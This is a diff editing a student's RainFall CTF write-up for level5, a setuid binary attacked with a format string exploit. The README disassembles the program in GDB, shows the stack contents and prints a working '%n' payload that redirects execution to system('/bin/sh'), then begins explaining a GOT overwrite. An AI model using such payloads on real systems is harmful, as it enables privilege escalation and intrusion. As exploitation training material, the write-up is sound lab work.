@@ -20,7 +20,7 @@ level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
 
 The file is owned by **level6** and has the **setuid** bit.
 
-We list the functions inside the executable and analyze their assembly code with **GDB**.
+We list the functions inside the executable.
 
 ```
 (gdb) info functions
@@ -55,7 +55,7 @@ Non-debugging symbols:
 0x080485cc  _fini
 ```
 
-There are 3 interesting functions: `main()`, `o()` and `n()`.
+There are 3 user-defined functions: `main()`, `o()` and `n()`.
 
 ```
 (gdb) disas main
@@ -69,7 +69,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-The `main()` function only calls the `n()` function.
+The `main()` function calls the `n()` function.
 
 ```
 (gdb) disas n
@@ -92,8 +92,8 @@ End of assembler dump.
 ```
 
 The `n()` function:
-- calls `fgets()` to read user input from stdin
-- pass the user input to `printf()`
+- calls `fgets()` to read user input and store it in `[ebp - 0x208]`
+- calls `printf()` to print `fgets()` buffer
 - calls `exit()`
 
 ```
@@ -109,12 +109,12 @@ Dump of assembler code for function o:
 End of assembler dump.
 ```
 
-The `o()` function only calls `system("/bin/sh")`.
+The `o()` function calls `system()` to execute `/bin/sh`.
 
 From our experience with the previous levels, we figure out that we will have to complete this one with a **format string attack**, thanks to `printf()`, in order to call `o()`.  
 The logic is similar to the **level3** and **level4**, do not hesitate to read their `README` if needed.
 
-Our first attempt to get the password is to overwrite the `old eip` stored before calling `printf()` with the address of `o()`.
+Our first attempt to get the password is to overwrite the `old eip` stored when calling `printf()` with the address of `o()`.
 
 ```
 (gdb) b printf
@@ -124,23 +124,8 @@ Starting program: /home/user/level5/level5
 AAAA
 
 Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) info registers
-eax            0xbffff430	-1073744848
-ecx            0xb7fda005	-1208115195
-edx            0xb7fd28c4	-1208145724
-ebx            0xb7fd0ff4	-1208152076
-esp            0xbffff41c	0xbffff41c
-ebp            0xbffff638	0xbffff638
-esi            0x0	0
-edi            0x0	0
-eip            0xb7e78850	0xb7e78850 <printf>
-eflags         0x200292	[ AF SF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
+(gdb) i r esp
+esp            0xbffff41c       0xbffff41c
 (gdb) x/16wx 0xbffff41c
 0xbffff41c:	0x080484f8	0xbffff430	0x00000200	0xb7fd1ac0
 0xbffff42c:	0xb7ff37d0	0x41414141	0xb7e2000a	0x00000001
@@ -154,7 +139,7 @@ The first hexadecimal address `0x080484f8`, at the top of the stack, represents 
 level5@RainFall:~$ (python -c "print('\x1c\xf4\xff\xbf' + '%8x%8x%134513808x' + '%n')"; cat) | ./level5
 ```
 
-Unfortunately the spawned shell is instantly closing. After discussing with other students, the `exit()` calls may be the reason of our problem. To bypass this issue, we can perform a **GOT overwrite**.
+Unfortunately the spawned shell is being instantly closed. After discussing with other students, the `exit()` calls may be the reason of our problem. To bypass this issue, we can perform a **GOT overwrite**.
 
 > Basically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like libc functions). By doing so, the executable will cache the memory address in the GOT, so that it doesn’t have to ask libc each time an external function is called.
 
